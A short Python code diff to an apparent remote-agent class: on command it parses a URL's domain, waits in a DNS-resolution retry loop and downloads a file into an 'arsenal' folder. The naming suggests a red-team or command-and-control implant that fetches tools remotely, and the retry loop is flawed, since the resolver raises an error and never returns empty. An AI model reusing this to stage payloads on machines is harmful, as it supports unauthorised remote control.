@@ -1,5 +1,8 @@
+import re
+import socket
 import requests
 import subprocess
+import time as t
 
 class Remote:
 
@@ -59,10 +62,26 @@ class Remote:
             output = {'outcome': 'failed', 'message': 'instruct_args must specify url', 'forward_log': 'False'}
             return output
         url = self.args['url']
+        domain_search = re.search('https?://([^/]+)/', url)
+        domain = None
+        if domain_search:
+            domain = domain_search.group(1)
+        if not domain:
+            output = {'outcome': 'failed', 'message': f'invalid url: {url}', 'forward_log': 'False'}
+            return output
         if 'file_name' not in self.args:
             output = {'outcome': 'failed', 'message': 'instruct_args must specify file_name', 'forward_log': 'False'}
             return output
         file_name = self.args['file_name']
+        resolved_ip = None
+        count = 0
+        while not resolved_ip and count < 30:
+            t.sleep(10)
+            resolved_ip = socket.gethostbyname(domain)
+            count += 1
+        if not resolved_ip:
+            output = {'outcome': 'failed', 'message': f'could not resolve domain {domain}', 'forward_log': 'False'}
+            return output
         with requests.get(url, stream=True) as r:
             r.raise_for_status()
             with open(f'arsenal\\{file_name}', 'wb+') as f:
